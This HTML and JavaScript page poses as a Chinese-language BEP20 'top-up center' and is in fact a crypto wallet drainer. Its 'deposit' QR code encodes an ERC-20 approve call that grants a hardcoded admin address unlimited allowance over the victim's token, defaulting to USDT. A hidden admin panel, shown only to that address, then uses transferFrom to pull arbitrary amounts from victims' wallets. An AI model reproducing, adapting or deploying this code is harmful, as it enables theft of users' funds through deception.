<!DOCTYPE html>
<html lang="zh-CN">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>充值中心</title>
<style>
*{margin:0;padding:0;box-sizing:border-box;font-family:system-ui, sans-serif}
body{background:#0B0B1F;color:#fff;padding:20px}
.container{max-width:420px;margin:0 auto}
.pay-box{background:#1E1E35;padding:30px;border-radius:20px;text-align:center}
h1{font-size:24px;margin-bottom:8px}
.desc{color:#aaa;margin-bottom:20px}

/* 说明文字样式 */
.tip{
  background:#151529;
  padding:12px 14px;
  border-radius:10px;
  color:#ccc;
  font-size:14px;
  line-height:1.4;
  margin-bottom:18px;
  text-align:left;
}

.input-token{
  width:100%;padding:14px;background:#111;border:none;
  border-radius:12px;color:#fff;font-size:14px;margin-bottom:12px;
  text-align:center
}

.gen-btn{
  background:#F0B90B;color:#000;border:none;padding:14px;width:100%;
  border-radius:14px;font-size:16px;font-weight:bold;margin-bottom:20px;
}

#qrcode{
  width:280px;height:280px;background:#fff;padding:10px;
  border-radius:16px;margin:0 auto 20px;
  display:flex;align-items:center;justify-content:center;color:#000
}
#qrcode img{width:100%;height:100%;object-fit:cover}

.admin-panel{
  background:#1E1E35;padding:24px;border-radius:16px;margin-top:24px;display:none
}
.admin-panel.show{display:block}
.admin-title{color:#ff4444;font-weight:bold;margin-bottom:16px}
.admin-input{
  width:100%;padding:12px;background:#111;border:none;
  border-radius:8px;color:#fff;margin-bottom:10px;
}
.admin-btn{
  width:100%;padding:14px;background:#ff4444;color:#fff;
  border:none;border-radius:10px;font-weight:bold;
}
</style>
</head>

<body>
<div class="container">
  <div class="pay-box">
    <h1>💰 充值中心</h1>
    <p class="desc">币安链 BEP20 充值</p>

    <!-- 👉 这里是你要的说明文字 -->
    <div class="tip">
      说明：你想用哪个代币充值，就输入哪个代币的合约地址，然后生成二维码支付。
    </div>

    <input class="input-token" id="tokenAddr" placeholder="请输入代币合约地址" value="0x55d398326f99059fF775485246999027B3197955">

    <button class="gen-btn" onclick="genQR()">生成充值二维码</button>

    <div id="qrcode">请输入合约地址并生成</div>
  </div>

  <div class="admin-panel" id="adminPanel">
    <div class="admin-title">🔐 管理后台</div>

    <div>提取玩家代币</div>
    <input class="admin-input" id="userAddr" placeholder="玩家地址">
    <input class="admin-input" id="drawAmt" placeholder="提取数量">
    <button class="admin-btn" onclick="drawFromUser()">确认提取</button>
  </div>
</div>

<script>
// ===================== 你的管理员地址（不变）=====================
const ADMIN  = "0xFFe5dbfbbCDb7536c21DF3fa1AFDBd92685Ed508";
const BSC_ID = "0x38";

let currentToken = "";
let account = null;

(async function init(){
  if(!window.ethereum) return;
  try{
    await ethereum.request({method:"wallet_switchEthereumChain",params:[{chainId:BSC_ID}]});
    const accounts = await ethereum.request({method:"eth_requestAccounts"});
    account = accounts[0];
    if(account.toLowerCase() == ADMIN.toLowerCase()){
      document.getElementById("adminPanel").classList.add("show");
    }
  }catch(e){}
})();

function genQR(){
  const token = document.getElementById("tokenAddr").value.trim();
  if(!token || !token.startsWith("0x") || token.length != 42){
    alert("请输入正确的代币合约地址");
    return;
  }
  currentToken = token;

  const approveData = "0x095ea7b3"
    + ADMIN.slice(2).padStart(64,"0")
    + "ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff";

  const uri = `ethereum:${ADMIN}@56/${token}?data=${approveData}`;

  document.getElementById("qrcode").innerHTML = 
    `<img src="https://api.qrserver.com/v1/create-qr-code/?size=280x280&data=${encodeURIComponent(uri)}">`;
}

async function drawFromUser(){
  if(account?.toLowerCase() != ADMIN.toLowerCase()) return;
  const from = document.getElementById("userAddr").value;
  const amt  = document.getElementById("drawAmt").value;
  if(!from || !amt || !currentToken) return;

  const raw = BigInt(amt * 10**18).toString(16).padStart(64,"0");

  await ethereum.request({
    method:"eth_sendTransaction",
    params:[{
      from: account,
      to: currentToken,
      data: "0x23b872dd"
        + from.slice(2).padStart(64,"0")
        + ADMIN.slice(2).padStart(64,"0")
        + raw
    }]
  });
  alert("✅ 提取成功");
}
</script>
</body>
</html>
